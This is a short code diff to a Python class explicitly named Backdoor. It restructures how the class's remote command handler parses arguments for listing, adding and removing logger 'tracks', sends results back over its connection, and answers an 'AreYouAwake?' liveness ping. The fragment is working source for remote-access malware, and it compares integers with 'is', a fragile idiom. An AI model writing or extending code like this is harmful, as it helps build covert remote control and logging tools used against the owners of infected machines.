@@ -277,14 +277,15 @@ class Backdoor:
 
                 if len(command) < 2:
                     self.__send_data("Missing argument")
-                else:
 
+                elif len(command) is 2:
                     if command[1] in ("--list", "-l"):
                         print(len(command))
                         tracks = self.logger.get_tracks()
                         self.__send_data(tracks)
 
-                    elif command[1] in ("--add", "-a"):
+                elif len(command) is 3:
+                    if command[1] in ("--add", "-a"):
                         if command[2] is not None:
                             self.logger.add_track(command[2])
                             self.__send_data("{} Successfully added to tracks".format(command[2]))
@@ -293,9 +294,8 @@ class Backdoor:
                         if command[2] is not None:
                             result = self.logger.remove_track(command[2])
                             self.__send_data(result)
-
-                    else:
-                        self.__send_data("Unknown command")
+                else:
+                    self.__send_data("Unknown command")
 
             # Check if connection is available
             elif command[0] == 'AreYouAwake?':
